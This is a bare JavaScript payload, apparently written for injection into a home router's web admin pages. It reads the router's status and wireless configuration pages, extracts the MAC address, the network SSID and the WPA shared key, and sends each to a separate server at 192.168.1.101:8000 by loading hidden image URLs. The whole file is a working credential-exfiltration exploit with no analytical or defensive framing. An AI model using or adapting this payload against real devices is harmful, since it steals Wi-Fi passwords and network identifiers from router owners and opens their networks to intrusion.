var server = "192.168.1.101:8000";

function get(url, f) {
  var xmlhttp;
  if (window.XMLHttpRequest)
    xmlhttp = new XMLHttpRequest();
  else
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");

  xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
      f(xmlhttp.responseText);
    }
  }
  xmlhttp.open("GET", url, true);
  xmlhttp.send();
}

get("/status_main.stm", function(t) {
  var mac = t.match(/wlan_mac_addr="([^"]+)"/)[1];
  var elem = document.createElement("img");
  elem.src = "http://"+server+"/?mac="+mac;
  document.body.appendChild(elem);
});

get("/wireless_id.stm", function(t) {
  var essid = t.match(/name="ssid" size=\d+ maxlength=\d+ value="([^"]+)"/)[1];
  var elem = document.createElement("img");
  elem.src = "http://"+server+"/?essid="+essid;
  document.body.appendChild(elem);
});

get("/wireless_wpa.stm", function(t) {
  var wpa = t.match(/document.form0.sharedkey.value="([^"]+)"/)[1];
  var elem = document.createElement("img");
  elem.src = "http://"+server+"/?wpa="+wpa;
  document.body.appendChild(elem);
});
